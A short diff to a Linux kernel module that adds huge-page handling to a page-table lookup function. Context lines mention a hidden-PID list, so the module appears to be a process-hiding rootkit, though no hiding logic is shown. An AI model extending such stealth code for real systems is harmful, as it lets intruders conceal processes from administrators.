@@ -15,7 +15,7 @@
 #include <linux/dcache.h>
 #include <asm/pgtable.h>
 #include <asm/tlbflush.h>
-#include <linux/sched/task.h>
+#include <linux/sched/task.h> // For init_task
 
 // --- PID list management (copied from original) ---
 struct hidden_pid_entry {
@@ -211,6 +211,11 @@ static pte_t *get_pte_from_address(struct mm_struct *mm, unsigned long addr)
     pmd = pmd_offset(pud, addr);
     if (pmd_none(*pmd) || pmd_bad(*pmd))
         return NULL;
+
+    // Handle huge pages (e.g., 2MB pages mapped by a PMD)
+    if (pmd_huge(*pmd)) {
+        return (pte_t *)pmd;
+    }
 
     return pte_offset_kernel(pmd, addr);
 }
